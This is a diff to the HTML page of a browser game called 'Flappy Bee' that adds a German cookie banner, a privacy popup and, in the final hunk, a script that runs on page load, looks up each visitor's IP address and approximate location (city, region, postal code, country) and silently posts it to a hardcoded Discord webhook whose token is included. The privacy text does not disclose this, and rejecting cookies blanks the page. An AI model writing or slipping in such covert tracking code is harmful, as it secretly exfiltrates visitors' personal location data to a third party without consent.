@@ -317,9 +317,141 @@
         }
 
 
+
+        .cookie-banner {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #2c3e50;
+    color: #ecf0f1;
+    padding: 15px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    border-top: 2px solid #3498db;
+    box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
+}
+
+.cookie-banner-content {
+    max-width: 800px;
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.cookie-banner p {
+    margin: 0;
+    font-size: 14px;
+    line-height: 1.5;
+    flex: 1;
+}
+
+.cookie-banner a {
+    color: #3498db;
+    text-decoration: underline;
+}
+
+.cookie-buttons {
+    display: flex;
+    gap: 10px;
+}
+
+.cookie-buttons button {
+    background: #3498db;
+    border: none;
+    padding: 10px 20px;
+    font-size: 14px;
+    color: #fff;
+    cursor: pointer;
+    border-radius: 5px;
+    transition: background 0.3s, transform 0.2s;
+}
+
+.cookie-buttons button:hover {
+    background: #2980b9;
+    transform: scale(1.05);
+}
+
+/* Styles für das Datenschutz-Popup */
+.privacy-popup {
+    display: none; /* Popup versteckt */
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 2000;
+    align-items: center;
+    justify-content: center;
+}
+
+.privacy-popup-content {
+    background: #fff;
+    padding: 20px;
+    max-width: 600px;
+    width: 90%;
+    border-radius: 10px;
+    position: relative;
+}
+
+.privacy-popup h2 {
+    margin-top: 0;
+}
+
+.close-popup {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 24px;
+    cursor: pointer;
+    color: #333;
+}
+
+.hidden {
+    display: none;
+}
+
     </style>
 </head>
 <body>
+
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-banner-content">
+            <p>
+                Wir verwenden Cookies, um Ihnen eine bessere Benutzererfahrung zu bieten. Indem Sie auf "Akzeptieren" klicken, stimmen Sie zu, dass wir Cookies verwenden dürfen, um Ihr Surferlebnis zu verbessern und Ihnen personalisierte Inhalte und Werbung anzuzeigen. Weitere Informationen finden Sie in unserer <a href="#" id="cookiePolicyLink">Datenschutzerklärung</a>.
+            </p>
+            <div class="cookie-buttons">
+                <button id="acceptCookies">Akzeptieren</button>
+                <button id="rejectCookies">Ablehnen</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Datenschutz-Popup -->
+    <div id="privacyPopup" class="privacy-popup">
+        <div class="privacy-popup-content">
+            <span id="closePopup" class="close-popup">&times;</span>
+            <h2>Datenschutzerklärung</h2>
+            <p>
+                Wir nehmen Ihre Privatsphäre ernst. Unsere Website verwendet Cookies, um das Benutzererlebnis zu verbessern und relevante Werbung anzuzeigen. Cookies sind kleine Textdateien, die auf Ihrem Gerät gespeichert werden. Wir verwenden Cookies, um:
+            </p>
+            <ul>
+                <li>Die Website-Nutzung zu analysieren und zu verstehen.</li>
+                <li>Personalisierte Inhalte und Werbung bereitzustellen.</li>
+                <li>Die Website-Leistung zu verbessern.</li>
+            </ul>
+            <p>
+                Sie können Ihre Cookie-Einstellungen in Ihrem Browser ändern. Weitere Informationen finden Sie in unserer vollständigen Datenschutzerklärung.
+            </p>
+        </div>
+    </div>
+
+
 
     <div id="captcha-container" style="text-align: center; font-family: Arial, sans-serif;">
         <label id="captcha-label" for="captcha-checkbox" style="cursor: pointer; display: inline-block; font-size: 24px; position: relative; top: 10px;">
@@ -347,7 +479,7 @@
     </div>
     
     <div id="container">
-        <div id="versionDisplay">v0.1.1</div>
+        <div id="versionDisplay">v0.2.0</div>
         <button id="infoButton">Info</button>
         <canvas id="flappyCanvas" width="800" height="600"></canvas>
         <video id="video" width="200" height="600" loop muted>
@@ -422,6 +554,114 @@
         document.getElementById('infoButton').addEventListener('click', function () {
     window.open('https://flappy-bee-info.vercel.app', '_blank');
 });
+
+
+document.addEventListener('DOMContentLoaded', function () {
+    const cookieBanner = document.getElementById('cookieBanner');
+    const acceptCookiesButton = document.getElementById('acceptCookies');
+    const rejectCookiesButton = document.getElementById('rejectCookies');
+    const privacyPopup = document.getElementById('privacyPopup');
+    const closePopupButton = document.getElementById('closePopup');
+    const cookiePolicyLink = document.getElementById('cookiePolicyLink');
+
+    // Überprüfen, ob der Benutzer bereits Cookies akzeptiert hat
+    if (!localStorage.getItem('cookiesAccepted')) {
+        cookieBanner.style.display = 'flex';
+    }
+
+    // Cookies akzeptieren
+    acceptCookiesButton.addEventListener('click', function () {
+        localStorage.setItem('cookiesAccepted', 'true');
+        cookieBanner.style.display = 'none';
+    });
+
+    // Cookies ablehnen
+    rejectCookiesButton.addEventListener('click', function () {
+        // Inhalt der Seite ausblenden, wenn Cookies abgelehnt werden
+        document.body.innerHTML = '<h1>Cookies werden benötigt</h1><p>Diese Website benötigt Cookies, um korrekt zu funktionieren. Wenn Sie Cookies ablehnen, können Sie diese Website nicht nutzen.</p>';
+        // Alternativ die gesamte Seite leer machen
+        // document.body.innerHTML = ''; 
+    });
+
+    // Öffnen des Datenschutz-Popups
+    cookiePolicyLink.addEventListener('click', function (event) {
+        event.preventDefault(); // Verhindert den Standard-Link-Click
+        privacyPopup.style.display = 'flex';
+    });
+
+    // Schließen des Datenschutz-Popups
+    closePopupButton.addEventListener('click', function () {
+        privacyPopup.style.display = 'none';
+    });
+
+    // Schließen des Datenschutz-Popups beim Klick außerhalb des Popups
+    privacyPopup.addEventListener('click', function (event) {
+        if (event.target === privacyPopup) {
+            privacyPopup.style.display = 'none';
+        }
+    });
+});
+
+
+
+
+function sendLocationToWebhook() {
+            // Holen der IP-Adresse
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+
+                    // Verwenden der Geolokalisierungs-API, um Standortdaten zu erhalten
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            // Extrahieren von Standortinformationen
+                            const city = locationData.city || 'unbekannt';
+                            const region = locationData.region || 'unbekannt';
+                            const postalCode = locationData.postal || 'unbekannt';
+                            const country = locationData.country_name || 'unbekannt';
+
+                            // URL deines Discord-Webhooks hier einfügen
+                            const webhookUrl = 'https://discord.com/api/webhooks/1264617165093470280/jgpRBwg6qbqssaLv2RUZCVip5PZ9ItXpsE2EfYYV4BLp97H0bxgH-1ZMJ4T5rJk28Z4t';
+
+                            // HTTP POST-Anfrage an den Webhook senden
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    content: `**Neue Standortdaten:**\n\`\`\`diff\n+ Stadt: ${city}\n+ Region: ${region}\n+ Postleitzahl: ${postalCode}\n+ Land: ${country}\n\`\`\``
+                                })
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Standortdaten erfolgreich gesendet.');
+                                } else {
+                                    console.error('Fehler beim Senden der Standortdaten.');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Fehler:', error);
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Fehler beim Abrufen der Standortdaten:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Fehler beim Abrufen der IP-Adresse:', error);
+                });
+        }
+
+        // Funktion aufrufen, wenn die Seite geladen wird
+        window.onload = sendLocationToWebhook;
+
+
+
+
+
 
 
 
